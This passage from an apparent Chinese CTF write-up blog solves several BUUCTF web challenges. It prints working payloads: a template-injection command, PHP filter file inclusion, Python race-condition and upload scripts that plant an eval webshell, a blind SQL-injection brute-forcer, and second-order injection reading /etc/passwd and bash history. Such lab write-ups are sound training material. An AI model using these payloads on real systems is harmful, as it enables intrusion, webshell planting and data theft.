<pre tabindex="0"><code>?name={{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag.txt&#39;).read()}}
</code></pre><p>flag{b9856c2c-0829-44e4-925a-78ded6c2c35c}</p>
<p>&ndash;</p>
<h2 id="npuctf2020ezinclude">[NPUCTF2020]ezinclude<a hidden class="anchor" aria-hidden="true" href="#npuctf2020ezinclude">#</a></h2>
<p>Cookie中的哈希就是对应name的pass，传入相应参数再看源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>?name=1<span style="color:#960050;background-color:#1e0010">&amp;</span>pass=576322dd496b99d07b5b0f7fa7934a25
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>           window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flflflflag.php&#34;</span>;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--md5($secret.$name)===$pass --&gt;</span>
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>直接跳转会被定向到404页面，查看源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>           window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;404.html&#34;</span>;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>include($_GET[&#34;file&#34;])&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>先用php伪协议看看flflflflag.php内容，base64解码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">read</span><span style="color:#f92672">/</span><span style="color:#a6e22e">convert</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">-</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#a6e22e">flflflflag</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$file<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;file&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/data|input|zip/is&#39;</span>,$file)){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;nonono&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">include</span>($file);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;include($_GET[&#34;file&#34;])&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>扫一下目录，找到一个dir.php，同样用伪协议获取源码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;/tmp&#39;</span>));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>方法一：利用PHP_SESSION_UPLOAD_PROGRESS+条件竞争写入一句话木马</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://0669c1b7-e523-4106-b94e-af29da2fcbbc.node5.buuoj.cn:81/flflflflag.php&#34;</span>
</span></span><span style="display:flex;"><span>sessid <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;phpinfo&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#39;file&#39;</span>, (<span style="color:#e6db74">&#39;a.txt&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span>)),
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span>: <span style="color:#e6db74">&#34;&lt;?php phpinfo();file_put_contents(&#39;shell.php&#39;, &#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;&#34;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(
</span></span><span style="display:flex;"><span>            url,
</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> data,
</span></span><span style="display:flex;"><span>            files <span style="color:#f92672">=</span> files,
</span></span><span style="display:flex;"><span>            cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>: sessid},
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">?file=/tmp/sess_</span><span style="color:#e6db74">{</span>sessid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>,
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;flag{&#39;</span> <span style="color:#f92672">in</span> response<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            print(response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>            sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>    t1 <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>upload)
</span></span><span style="display:flex;"><span>    t2 <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>read)
</span></span><span style="display:flex;"><span>    t1<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span>    t2<span style="color:#f92672">.</span>start()  
</span></span></code></pre></div><p>方法二：利用strip_tags过滤器</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> io <span style="color:#f92672">import</span> BytesIO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;?php eval($_REQUEST[1]);?&gt;&#34;</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;file&#39;</span>: BytesIO(payload<span style="color:#f92672">.</span>encode())}
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://0669c1b7-e523-4106-b94e-af29da2fcbbc.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url,files<span style="color:#f92672">=</span>data,allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>访问dir.php获取tmp下临时文件：</p>
<pre tabindex="0"><code>string(9) &#34;phpdazEZv&#34;
</code></pre><p>包含该文件即可rce
flag{71136865-f2df-413e-98aa-2f66f26c324c}</p>
<p>参考文章：</p>
<p><a href="https://exp10it.io/2022/11/buuctf-web-writeup-6/#npuctf2020ezinclude">https://exp10it.io/2022/11/buuctf-web-writeup-6/#npuctf2020ezinclude</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/17992004">https://www.cnblogs.com/EddieMurphy-blogs/p/17992004</a></p>
<hr>
<h2 id="nctf2019sqli">[NCTF2019]SQLi<a hidden class="anchor" aria-hidden="true" href="#nctf2019sqli">#</a></h2>
<p>robots.txt中禁止访问hint.txt，hint.txt：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$black_list <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">If</span> $_POST[<span style="color:#e6db74">&#39;passwd&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#a6e22e">admin</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">password</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Then</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">will</span> <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">flag</span>;
</span></span></code></pre></div><p>利用反斜杠转义引号＋%00截断尾部引号实现可控passwd</p>
<p>抓包发现如果从网页中传入<code>%00</code>其实是POST<code>%2500</code>，猜测后端是对参数进行了urldecode，直接POST传<code>%00</code>即可</p>
<pre tabindex="0"><code>username=1\&amp;passwd=||passwd/**/regexp/**/&#34;^y&#34;;%00
</code></pre><p>如果成功匹配到passwd会在相应包header中返回<code>location: welcome.php</code>，爆破出passwd：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib <span style="color:#f92672">import</span> parse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://d5f06424-bdcf-4fd0-95b8-8cf3ec61d0ef.node5.buuoj.cn:81&#34;</span>
</span></span><span style="display:flex;"><span>chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> parse<span style="color:#f92672">.</span>unquote(<span style="color:#e6db74">&#34;%00&#34;</span>)
</span></span><span style="display:flex;"><span>passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">80</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> chars:
</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;||passwd/**/regexp/**/&#34;^</span><span style="color:#e6db74">{</span>passwd<span style="color:#f92672">+</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;;</span><span style="color:#e6db74">{</span>n<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;passwd&#34;</span>: payload}
</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;welcome&#34;</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            print(c)
</span></span><span style="display:flex;"><span>            passwd <span style="color:#f92672">+=</span> c
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(passwd)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># you_will_never_know7788990</span>
</span></span></code></pre></div><p>flag{8cad5c15-4ca5-4405-9735-ca1089060f97}</p>
<hr>
<h2 id="网鼎杯-2020-半决赛alicewebsite">[网鼎杯 2020 半决赛]AliceWebsite<a hidden class="anchor" aria-hidden="true" href="#网鼎杯-2020-半决赛alicewebsite">#</a></h2>
<p>index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>        $action <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;action&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;action&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;home.php&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($action)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">include</span> $action;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;File not found!&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>文件包含，尝试获取/flag：flag{36b34fb4-3c20-418e-b83c-a7cd5459efcb}</p>
<hr>
<h2 id="网鼎杯-2018comment">[网鼎杯 2018]Comment<a hidden class="anchor" aria-hidden="true" href="#网鼎杯-2018comment">#</a></h2>
<p>弱密码，账号zhangwei，密码zhangwei666</p>
<p>存在.git源码泄露，直接用githacker获取到的write_do.php不完整，回滚一下记录：</p>
<pre tabindex="0"><code>git log --reflog

commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)
Merge: bfbdf21 5556e3a
Author: root &lt;root@localhost.localdomain&gt;
Date:   Sat Aug 11 22:51:17 2018 +0800

    WIP on master: bfbdf21 add write_do.php

commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf
Author: root &lt;root@localhost.localdomain&gt;
Date:   Sat Aug 11 22:51:17 2018 +0800

    index on master: bfbdf21 add write_do.php

commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master, origin/master, origin/HEAD)
Author: root &lt;root@localhost.localdomain&gt;
Date:   Sat Aug 11 22:47:29 2018 +0800

    add write_do.php
</code></pre><p>有stash记录，查看并恢复stash：</p>
<pre tabindex="0"><code>git stash list
stash@{0}: WIP on master: bfbdf21 add write_do.php

git stash apply stash@{0}
On branch master
Your branch is up to date with &#39;origin/master&#39;.

Changes not staged for commit:
  (use &#34;git add &lt;file&gt;...&#34; to update what will be committed)
  (use &#34;git restore &lt;file&gt;...&#34; to discard changes in working directory)
        modified:   write_do.php

no changes added to commit (use &#34;git add&#34; and/or &#34;git commit -a&#34;)
</code></pre><p>完整的write_do.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;mysql.php&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;login&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;yes&#39;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: ./login.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;do&#39;</span>])){
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> ($_GET[<span style="color:#e6db74">&#39;do&#39;</span>])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;write&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    $category <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;category&#39;</span>]);
</span></span><span style="display:flex;"><span>    $title <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;title&#39;</span>]);
</span></span><span style="display:flex;"><span>    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;content&#39;</span>]);
</span></span><span style="display:flex;"><span>    $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;insert into board
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            set category = &#39;</span><span style="color:#e6db74">$category</span><span style="color:#e6db74">&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                title = &#39;</span><span style="color:#e6db74">$title</span><span style="color:#e6db74">&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                content = &#39;</span><span style="color:#e6db74">$content</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: ./index.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;comment&#39;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    $bo_id <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;bo_id&#39;</span>]);
</span></span><span style="display:flex;"><span>    $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select category from board where id=&#39;</span><span style="color:#e6db74">$bo_id</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql);
</span></span><span style="display:flex;"><span>    $num <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_num_rows</span>($result);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($num<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>){
</span></span><span style="display:flex;"><span>    $category <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_fetch_array</span>($result)[<span style="color:#e6db74">&#39;category&#39;</span>];
</span></span><span style="display:flex;"><span>    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;content&#39;</span>]);
</span></span><span style="display:flex;"><span>    $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;insert into comment
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            set category = &#39;</span><span style="color:#e6db74">$category</span><span style="color:#e6db74">&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                content = &#39;</span><span style="color:#e6db74">$content</span><span style="color:#e6db74">&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                bo_id = &#39;</span><span style="color:#e6db74">$bo_id</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: ./comment.php?id=</span><span style="color:#e6db74">$bo_id</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: ./index.php&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: ./index.php&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>没有index.php和comment.php的代码，只知道INSERT语句的具体内容，无法得知相应页面获取数据的具体语句，可以先尝试构造注入语句。由于是多行的SQL语句，<code>#</code>注释符只对单行生效，因此需要用到<code>/**/</code>，注入category=<code>1',content=(select user()),/*</code>，content=<code>*/#</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">insert</span> <span style="color:#66d9ef">into</span> <span style="color:#66d9ef">comment</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">set</span> category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span>,content<span style="color:#f92672">=</span>(<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">user</span>()),<span style="color:#75715e">/*&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                content = &#39;*/</span><span style="color:#f92672">#</span><span style="color:#e6db74">&#39;,
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                bo_id = &#39;</span><span style="color:#960050;background-color:#1e0010">$</span>bo_id<span style="color:#e6db74">&#39;&#34;
</span></span></span></code></pre></div><p>comment.php中存在二次注入，获取用户权限为：root@localhost</p>
<p>尝试利用load_file读取/etc/passwd：</p>
<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin libuuid:x:100:101::/var/lib/libuuid: syslog:x:101:104::/home/syslog:/bin/false mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false www:x:500:500:www:/home/www:/bin/bash 
</code></pre><p>尝试读取 /home/www/.bash_history：</p>
<pre tabindex="0"><code>cd /tmp/ unzip html.zip rm -f html.zip cp -r html /var/www/ cd /var/www/html/ rm -f .DS_Store service apache2 start 
</code></pre><p>删除了/var/www/html目录下的.DS_Store文件，但是之前在/tmp目录中解压得到的该文件仍存在，用hex读取二进制文件/tmp/html/.DS_Store，本地转换为原文件后用工具解析：</p>
<pre tabindex="0"><code>python main.py .DS_Store
Count:  11
bootstrap
comment.php
css
flag_8946e1ff1ee3e40f.php
fonts
index.php
js
login.php
mysql.php
vendor
write_do.php
</code></pre><p>读取flag文件：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	$flag<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flag{da6b6412-ea59-4408-a49e-34af567e11aa}&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>参考文章：</p>
<p><a href="https://www.freebuf.com/articles/web/410701.html">https://www.freebuf.com/articles/web/410701.html</a></p>
<p><a href="https://cn-sec.com/archives/2696887.html">https://cn-sec.com/archives/2696887.html</a></p>
<p><a href="https://exp10it.io/2022/11/buuctf-web-writeup-6/#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018comment">https://exp10it.io/2022/11/buuctf-web-writeup-6/#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018comment</a></p>
